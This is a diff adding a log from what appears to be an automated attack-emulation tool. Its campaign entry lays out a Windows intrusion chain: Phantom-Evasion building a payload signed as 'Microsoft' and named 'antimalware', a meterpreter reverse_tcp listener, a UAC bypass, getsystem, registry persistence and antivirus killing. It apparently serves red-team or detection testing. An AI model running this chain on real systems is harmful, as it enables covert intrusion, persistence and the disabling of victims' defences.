@@ -1,0 +1,34 @@
+2020-03-31 02:33:34,560- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-31 02:33:34,569- attack-thread - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA04_T1088_P1': {'name': 'bypassuac_sluihijack', 'tactic': 'Privilege_Escalation', 'try_count': 3, 'spawn_seperate_session': False, 'tool': 'metasploit', 'exploit': 'windows/local/bypassuac_sluihijack', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA04_T1134_P1': {'name': 'getsystem', 'tactic': 'Privilege_Escalation', 'try_count': 1, 'spawn_seperate_session': False, 'type': 'command', 'service': 'None', 'tool': 'meterpreter', 'command': 'getsystem'}}, {'TA03_T1060_P2': {'name': 'registry_persistence', 'tactic': 'Persistence', 'try_count': 1, 'spawn_seperate_session': False, 'tool': 'metasploit', 'post': 'windows/local/registry_persistence', 'payload': 'payload windows/x64/meterpreter/reverse_tcp', 'options': {'BLOB_REG_NAME': 'BLOB_REG_NAME_$ref', 'RUN_NAME': 'RUN_NAME_$ref', 'STARTUP': 'SYSTEM', 'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 5, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-31 02:33:34,570- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-31 02:33:34,570- attack-thread - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible', 'metasploit', 'meterpreter', 'metasploit', 'meterpreter']
+2020-03-31 02:33:34,571- attack-thread - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-03-31 02:33:34,572- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 02:33:34,572- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:33:34,573- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 02:33:34,573- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:33:34,574- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 02:33:34,574- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:33:34,575- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 02:33:34,599- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 02:33:34,600- attack-thread - INFO - Reason: payload generation
+2020-03-31 02:33:45,088- attack-thread - INFO - Please insert option: 1
+2020-03-31 02:33:45,746- attack-thread - INFO - Please insert option: 2
+2020-03-31 02:33:46,304- attack-thread - INFO - Please insert option: 2
+2020-03-31 02:33:47,866- attack-thread - INFO - Please insert payload number: 3
+2020-03-31 02:33:48,023- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 02:33:48,180- attack-thread - INFO - Please insert LHOST: 192.168.18.61
+2020-03-31 02:33:48,232- attack-thread - INFO - Please insert LPORT: 40481
+2020-03-31 02:33:48,284- attack-thread - INFO - Please insert output filename: antimalware
+2020-03-31 02:33:48,836- attack-thread - INFO - Add multiple processes behaviour: n
+2020-03-31 02:33:50,129- attack-thread - INFO - Strip executable\?: y
+2020-03-31 02:33:51,687- attack-thread - INFO - Sign executable\?: y
+2020-03-31 02:33:51,740- attack-thread - INFO - use already existing certificate: y
+2020-03-31 02:33:51,793- attack-thread - INFO - Select a Certificate: 1
+2020-03-31 02:33:51,846- attack-thread - INFO - Insert sign software description: Microsoft
+2020-03-31 02:33:53,139- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 02:33:53,598- attack-thread - INFO - Please insert option: 0
+2020-03-31 02:33:53,599- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:33:53,600- attack-thread - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-03-31 02:33:53,600- attack-thread - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-03-31 02:33:53,633- attack-thread - INFO - Category Not Found
